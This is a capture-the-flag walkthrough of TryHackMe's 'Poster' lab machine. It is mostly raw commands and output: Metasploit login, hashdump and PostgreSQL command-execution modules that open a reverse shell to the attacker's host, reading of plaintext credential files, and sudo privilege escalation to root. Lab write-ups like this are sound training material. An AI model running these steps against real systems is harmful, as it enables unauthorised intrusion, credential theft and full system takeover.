---
title: Poster
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Poster machine
  on TryHackMe.
slug: poster
---




```
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGK2azIgGLY4GFFZlpgMpyOub/To5vmftSEWkjbtFkTBvc5tW/SpoDtjyNMT0JKJUmFJ2/vp6oIpwyIRtDa+oomuNL//exbp/i798hl8FFo4Zq5HsDvQCwNKZ0lfk0HGYgbXj6WAjohokSbkDY1U26FN/MKE2JxcXLcN8n1QmvVbP5p8zO/jgrXvX6DLv4eHxJjhzsBJ6DwFMchtBwy4CiTQsiCUcAyyua93LJO6NEnnM4SOwOUE/wyggCNPbwzB1wzPLAgaiU+M2gn9/XZGmlD+vWOBu3sruCB2PnRuM3cx27gDbbElR4KDIOq2ar66rV+yIZQoQ7KfVUNUFFCbRz
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN2f/wWkOMnH6rNZ+0m2p+PrzBVbz/vfQ/k9rx9W27i9DLBKmRM2b2ntmg8tSwHhZVTb/FvStJci9SIBLAqao00=
|   256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYg/uhFbBiQ1iu6NNNYtD/tRDbHmPXw4p/nYv+twijq
80/tcp   open  http       syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5432/tcp open  postgresql syn-ack ttl 62 PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-29T00:54:25
| Not valid after:  2030-07-27T00:54:25
| MD5:   da57:3213:e9aa:9274:d0be:c1b0:bbb2:0b09
| SHA-1: 4e03:8469:28f7:673b:2bb2:0440:4ba9:e4d2:a0d0:5dd5
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAIrmTOUt3qZtMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDA3MjkwMDU0MjVaFw0zMDA3MjcwMDU0MjVaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMca
| tkPhi1xPkNomQzkTX+XRDk0RPBxRJQm17+Q8sru8J72rToPVyZesM7v5M+ttfqlZ
| sHAevEv/iVb1D6hNPawU9kG61Ja9baHd1s31H7RjWxpMS2vZuiu6/oXNWpc4yinQ
| RDWgLqKhDzczacMWLxKkgh06H8DI04/4pCJ6pbf6gXFfVRrccOu1FmoVlWWdVeGd
| CZ2C8XOA1tEEE6UG9HI9Q2gd3AHOSex+ar3EnWm1LanYDQPJSXEgl/K2A9D5DQEw
| +xJxPnH9abqxUrLUDOxzbMpdqXfb0OHxy7jeBJhpd6DonAZTEACdsgh9SzssH4ac
| FOqjsJjfSzok3x3uBx0CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAxGskqCN0uihEe1rpb7fveGYGMhDsFso9aYdJ4Q3CHJHX3leCN92nLCOq
| R9bTRgVjrvph00jO3+qhHzXCLbnpZXu9R9mPsfcDU/IFCFxMNmjRs4DkkzpGWAyp
| t5I18Zxh4JWJP7Mf1zc39z2Zk/IucAI5kMPMDJUWR/mjVFG/iZY8W+YlKsfvWblU
| tY4RYFhVy9JTVFYe5ZxghLxylYi+cbkGcPMj7qaOkDWIWhILZX1DDAb7cSfVd4rq
| 2ayWhA4Dh/FJkL2j+5mfAku0C7qMAqSlJTMRa6pTQjXeGafLDBoomQIIFnhWOITS
| fohtzsob6PyjssrRoqlRkJLJEJf2YQ==
|_-----END CERTIFICATE-----

```

```
use auxiliary/scanner/postgres/postgres_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session

set RHOSTS 10.64.143.196
RHOSTS => 10.64.143.196
msf auxiliary(scanner/postgres/postgres_login) > run

10.64.143.196:5432 - Login Successful:...................
```

```
msf auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.64.143.196
RHOSTS => 10.64.143.196
msf auxiliary(admin/postgres/postgres_sql) > set USERNAME postgres
USERNAME => postgres
msf auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
PASSWORD => password
msf auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.64.143.196
Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

```

```
msf auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD password
PASSWORD => password
msf auxiliary(scanner/postgres/postgres_hashdump) > run
[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/postgres/postgres_hashdump) > 
```

```
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhosts 10.65.141.135
rhosts => 10.65.141.135
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set username postgres
username => postgres
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password password
password => password
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost tun0
lhost => 192.168.153.193
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > check
[*] 10.65.141.135:5432 - The target appears to be vulnerable.
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
[-] Handler failed to bind to 192.168.153.193:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] 10.65.141.135:5432 - 10.65.141.135:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.65.141.135:5432 - Exploiting...
[+] 10.65.141.135:5432 - 10.65.141.135:5432 - gDlLyIsqTYSO dropped successfully
[+] 10.65.141.135:5432 - 10.65.141.135:5432 - gDlLyIsqTYSO created successfully
[+] 10.65.141.135:5432 - 10.65.141.135:5432 - gDlLyIsqTYSO copied successfully(valid syntax/command)
[+] 10.65.141.135:5432 - 10.65.141.135:5432 - gDlLyIsqTYSO dropped successfully(Cleaned)
[*] 10.65.141.135:5432 - Exploit Succeeded
[*] Command shell session 1 opened (192.168.153.193:4444 -> 10.65.141.135:41628) at 2025-12-09 12:45:13 -0500

shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[*] Found python3 at /usr/bin/python3
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
id
id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
postgres@ubuntu:/var/lib/postgresql/9.5/main$ 

postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd ~
cd ~
postgres@ubuntu:/var/lib/postgresql$ cd ../../../
cd ../../../
postgres@ubuntu:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
postgres@ubuntu:/$ cd home
cd home
postgres@ubuntu:/home$ ls
ls
alison  dark
postgres@ubuntu:/home$ cd alison
cd alison
postgres@ubuntu:/home/alison$ ls
ls
user.txt
postgres@ubuntu:/home/alison$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
postgres@ubuntu:/home/alison$ cp user.txt /tmp
cp user.txt /tmp
postgres@ubuntu:/home/alison$ 
postgres@ubuntu:/home/alison$ cat /etc/crontab
cat /etc/crontab

# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /opt/ufw && bash ufw.sh
#
postgres@ubuntu:/home/alison$ 

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm


```

```
postgres@ubuntu:/home$ ls
ls
alison  dark
postgres@ubuntu:/home$ cd dark
cd dark
postgres@ubuntu:/home/dark$ ls -la
ls -la
total 28
drwxr-xr-x 2 dark dark 4096 Jul 28  2020 .
drwxr-xr-x 4 root root 4096 Jul 28  2020 ..
-rw------- 1 dark dark   26 Jul 28  2020 .bash_history
-rw-r--r-- 1 dark dark  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 dark dark 3771 Aug 31  2015 .bashrc
-rwxrwxrwx 1 dark dark   24 Jul 28  2020 credentials.txt
-rw-r--r-- 1 dark dark  655 May 16  2017 .profile
postgres@ubuntu:/home/dark$ cat credentials.txt
```

> now i have ssh credentials

```
dark@ubuntu:/home/alison$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /opt/ufw && bash ufw.sh
#
dark@ubuntu:/home/alison$ find / -user alison 2> /dev/null
/home/alison
/home/alison/.bashrc
/home/alison/.bash_logout
/home/alison/.nano
/home/alison/.profile
............

```

```
dark@ubuntu:/home/alison$ cd /var/www/html
dark@ubuntu:/var/www/html$ ls -la
total 16
drwxr-xr-x 3 root   root   4096 Jul 28  2020 .
drwxr-xr-x 3 root   root   4096 Jul 28  2020 ..
-rwxrwxrwx 1 alison alison  123 Jul 28  2020 config.php
drwxr-xr-x 4 alison alison 4096 Jul 28  2020 poster
dark@ubuntu:/var/www/html$ cat config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";


dark@ubuntu:/var/www/html$ su alison
Password: 
alison@ubuntu:/var/www/html$ cd ~
alison@ubuntu:~$ cd /home
alison@ubuntu:/home$ ls
alison  dark
alison@ubuntu:/home$ cd alison
alison@ubuntu:~$ ls
user.txt
alison@ubuntu:~$ cat user.txt

```

```
alison@ubuntu:~$ sudo -l
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:~$ sudo su
root@ubuntu:/home/alison# cd /root && cat root.txt
```